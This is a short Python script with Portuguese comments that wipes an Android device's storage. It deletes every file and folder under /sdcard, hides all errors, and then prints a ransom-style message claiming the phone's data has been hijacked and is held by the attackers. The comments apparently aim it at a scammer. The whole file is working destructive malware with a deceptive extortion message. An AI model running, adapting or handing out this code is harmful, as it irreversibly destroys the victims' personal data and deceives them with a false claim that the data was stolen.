# -*- coding: utf-8 -*-

import os
import shutil

# ir ate a memória do Android 
diretorio_sdcard = '/sdcard'

try:
    #se fudeu golpista
    for filename in os.listdir(diretorio_sdcard):
        file_path = os.path.join(diretorio_sdcard, filename)
        try:
            if os.path.isfile(file_path) or os.path.islink(file_path):
                os.unlink(file_path)
            elif os.path.isdir(file_path):
                shutil.rmtree(file_path)
        except Exception as e:
            # Comentamos as mensagens de erro
            pass

    # se fudeu
    print("Memória do celular sequestrada com susseso seus dados estão em nossas mãos")
except Exception as e:
    # Comentamos a mensagem de erro
    pass
